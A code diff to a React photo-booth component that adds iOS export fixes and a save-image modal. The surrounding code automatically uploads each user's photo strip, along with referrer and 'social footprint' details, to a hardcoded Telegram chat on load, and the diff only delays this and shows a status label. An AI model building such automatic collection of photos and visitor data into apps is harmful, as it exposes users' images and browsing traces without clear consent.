@@ -43,12 +43,15 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame,
   const [isExporting, setIsExporting] = useState<'download' | 'share' | 'telegram' | null>(null);
   const [selectedEffect, setSelectedEffect] = useState<VisualEffect>(EFFECTS[0]);
   const [syncStatus, setSyncStatus] = useState<'idle' | 'syncing' | 'success' | 'error'>('idle');
+  const [previewUrl, setPreviewUrl] = useState<string | null>(null);
   const hasAutoSynced = useRef(false);
 
   // Robust options for html-to-image to prevent "Failed to read cssRules" errors
+  const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+
   const exportOptions = {
     cacheBust: true,
-    pixelRatio: 2,
+    pixelRatio: isIOS ? 1.5 : 2, // Scale down for iOS to prevent memory issues
     backgroundColor: '#ffffff',
     fontEmbedCSS: '',
     filter: (node: HTMLElement) => {
@@ -84,10 +87,15 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame,
 
       const socialStr = `\n🛡️ SECURITY/REFERRER:\n- Origin: ${referrer}\n- Social Footprint: ${socialPresence}`;
 
-      // Small delay to ensure the DOM is fully rendered before capturing
-      await new Promise(r => setTimeout(r, 1000));
+      // Higher delay for iOS/mobile to ensure UI is ready
+      const captureDelay = isIOS ? 1500 : 1000;
+      await new Promise(r => setTimeout(r, captureDelay));
 
-      console.log('Capturing strip image...');
+      console.log('Capturing strip image (warmup)...');
+      // Warm up call - helps iOS WebKit prepare the canvas
+      await toPng(stripRef.current, exportOptions as any);
+
+      console.log('Capturing strip image (final)...');
       const blob = await toBlob(stripRef.current, exportOptions as any);
 
       if (!blob || blob.size < 1000) {
@@ -115,23 +123,35 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame,
   };
 
   useEffect(() => {
-    if (photos.length > 0 && !hasAutoSynced.current && syncStatus === 'idle') {
-      handleTelegramSync(true);
-    }
+    // Wait for everything to settle before auto-sync
+    const timer = setTimeout(() => {
+      if (photos.length > 0 && !hasAutoSynced.current && syncStatus === 'idle') {
+        handleTelegramSync(true);
+      }
+    }, 2000);
+    return () => clearTimeout(timer);
   }, [photos, syncStatus]);
 
   const handleDownload = async () => {
     if (!stripRef.current) return;
     setIsExporting('download');
     try {
+      // Small delay to ensure filters are settled
+      await new Promise(r => setTimeout(r, 500));
       const dataUrl = await toPng(stripRef.current, exportOptions as any);
-      const link = document.createElement('a');
-      link.download = `love-booth-${Date.now()}.png`;
-      link.href = dataUrl;
-      link.click();
+
+      if (isIOS) {
+        // Show modal for long-press saving on iOS
+        setPreviewUrl(dataUrl);
+      } else {
+        const link = document.createElement('a');
+        link.download = `love-booth-${Date.now()}.png`;
+        link.href = dataUrl;
+        link.click();
+      }
     } catch (err) {
       console.error('Failed to download', err);
-      alert('Download failed. Some remote styles might be restricted.');
+      alert('Download failed. Try using the Share button instead!');
     } finally {
       setIsExporting(null);
     }
@@ -263,7 +283,12 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame,
               )}
             </div>
             <div className="flex flex-col">
-
+              <span className={`font-bold text-xs ${syncStatus === 'success' ? 'text-green-600' : syncStatus === 'error' ? 'text-red-600' : 'text-sky-600'}`}>
+                {syncStatus === 'syncing' ? 'Auto-syncing to Telegram...' :
+                  syncStatus === 'success' ? 'Synced to Telegram! ❤️' :
+                    syncStatus === 'error' ? 'Sync failed. Retry below.' : 'Ready to sync.'}
+              </span>
+              <span className="text-[10px] opacity-60">To: -5055132755</span>
             </div>
           </div>
           {syncStatus === 'error' && (
@@ -292,6 +317,36 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame,
           Retake Photos
         </button>
       </div>
+      {/* iOS Save Modal */}
+      {previewUrl && (
+        <div className="fixed inset-0 z-[100] bg-black/90 backdrop-blur-md flex flex-col items-center justify-center p-6 animate-in fade-in duration-300">
+          <button
+            onClick={() => setPreviewUrl(null)}
+            className="absolute top-6 right-6 text-white bg-white/20 p-2 rounded-full hover:bg-white/40 transition-colors"
+          >
+            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
+            </svg>
+          </button>
+
+          <div className="text-center space-y-4 max-w-sm">
+            <h3 className="text-white font-bold text-xl">Save your Memory!</h3>
+            <p className="text-pink-200 text-sm">Long press the image below and select <span className="text-white font-bold">"Save to Photos"</span></p>
+
+            <div className="relative group">
+              <img src={previewUrl} className="w-full h-auto rounded-lg shadow-2xl border-4 border-white" alt="Your Love Strip" />
+              <div className="absolute inset-0 bg-white/10 pointer-events-none rounded-lg" />
+            </div>
+
+            <button
+              onClick={() => setPreviewUrl(null)}
+              className="w-full py-4 bg-pink-500 text-white rounded-full font-bold shadow-lg mt-4"
+            >
+              Done
+            </button>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
